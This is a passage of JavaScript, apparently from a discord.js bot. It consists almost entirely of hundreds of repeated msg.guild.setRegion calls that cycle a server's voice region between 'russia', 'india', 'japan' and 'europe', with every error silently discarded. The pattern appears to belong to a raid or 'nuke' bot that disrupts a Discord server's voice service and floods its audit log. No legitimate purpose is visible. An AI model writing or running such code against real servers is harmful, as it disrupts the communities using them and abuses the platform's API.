    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('europe').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('europe').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('europe').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('europe').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('europe').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('europe').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('europe').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('europe').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('europe').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
